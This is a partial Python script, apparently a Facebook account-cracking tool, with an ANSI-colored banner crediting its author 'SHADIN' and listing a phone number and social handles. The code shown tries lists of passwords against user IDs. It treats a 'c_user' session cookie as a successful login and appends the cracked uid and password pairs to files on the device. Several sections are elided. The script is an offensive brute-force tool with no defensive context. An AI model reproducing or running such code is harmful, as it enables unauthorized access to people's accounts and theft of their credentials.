...
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐀𝐔𝐓𝐇𝐎𝐑   ║  \033[37;1m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SHADIN𝄟⃝  \033[38;5;46m║\033[38;5;46m𝐍𝐀𝐒𝐈𝐑             ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 ║  \033[37;1m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SHADIN𝄟⃝  \033[38;5;46m║\033[38;5;46m𝐍𝐀𝐒𝐈𝐑 𝐕𝐀𝐔         ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏 ║  \033[37;1m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SHADIN𝄟⃝  \033[38;5;46m║\033[38;5;46m01794492720       ║
\033[38;5;46m║[🔵]\x1b[38;5;196m𝐆𝐈𝐓𝐇𝐔𝐁   ║  \033[37;1m🦋⃟𝗕𝗢𝗦𝗦✮⃝ SHADIN𝄟⃝  \033[38;5;46m║\033[38;5;46m𝐍𝐀𝐒𝐈𝐑𝐕𝐀𝐔0         ║
...
def fuck():
    ...
    print(' [+] CP Ids saved in SHADIN ARMY/CP.txt')
    print('==================================================')
def mumit2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;92m[SHADIN]--[%s/%s]--[OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': 'fuck',}
            ...
            if 'c_user' in log_cookies:
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;94m[SHADIN ARMY-CP] {cid}|{ps}")
                open('/sdcard/SHADIN ARMY-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
